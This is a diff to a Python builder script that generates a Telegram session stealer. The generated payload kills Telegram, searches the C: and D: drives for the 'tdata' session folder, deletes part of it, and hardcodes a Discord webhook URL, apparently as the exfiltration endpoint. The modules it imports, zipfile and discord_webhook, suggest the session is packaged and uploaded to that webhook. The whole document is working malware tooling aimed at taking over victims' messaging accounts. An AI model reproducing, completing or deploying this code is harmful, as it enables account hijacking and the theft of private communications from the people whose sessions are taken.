@@ -1,13 +1,14 @@
 import os
 import sys
 
-def create_python_file(hook, user):
+def create_python_file(hook):
     template = f"""
 import os
+import time
 
 # depencies check
 home = os.path.expanduser('~')
-discord_path = os.path.join(home, 'AppData\\\\Local\\\\Packages\\\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\\\LocalCache\\\\local-packages\\\\Python311\\\\site-packages\\\\discord_webhook')
+discord_path = os.path.join(home, 'AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\discord_webhook')
 discord_status = os.path.isdir(discord_path)
 
 for i in range(1):
@@ -23,8 +24,26 @@ from zipfile import ZipFile, ZIP_DEFLATED
 import zipfile
 import shutil
 
-user = os.path.join(home, {user}) 
-hook = "{hook}"
+#search folder
+folder_name = 'tdata'
+
+search_pathD = 'D:\\\\'
+search_pathC = 'C:\\\\'
+
+found = False
+for root, dirs, files in os.walk(search_pathD):
+    if folder_name in dirs:
+        found = True
+        full_path = os.path.join(root, folder_name)
+
+for root, dirs, files in os.walk(search_pathC):
+    if folder_name in dirs:
+        found = True
+        full_path = os.path.join(root, folder_name)
+#search folder
+
+user = os.path.join(full_path) 
+hook = "https://discord.com/api/webhooks/1233813508907597905/g-G10KDBYHdAARXE-vQyKpR1rwh6A2McIuXsHl0PUZeAwMxXvCd0rfWq4v5t4oH8pUtX"
 # sources end
 
 #task_kill
@@ -33,6 +52,7 @@ os.system('taskkill /f /im Telegram.exe')
 
 #delete no use files
 folder_path = os.path.join(user, 'user_data')
+time.sleep(2)
 shutil.rmtree(folder_path)
 #delete no use files end
 
@@ -79,18 +99,7 @@ def main():
 
     hook = input("[Enter web hook url]: ")
 
-
-    default_user = r"'AppData\\Roaming\\Telegram Desktop\\tdata'"
-    
-
-    user = input(f"[Enter path to tdata or press ENTER for default path [{default_user}]]: ")
-
-
-    if not user:
-        user = default_user
-
-
-    create_python_file(hook, user)
+    create_python_file(hook)
     print("File 'generated_file.py' generated!")
 
 def set_def_color():
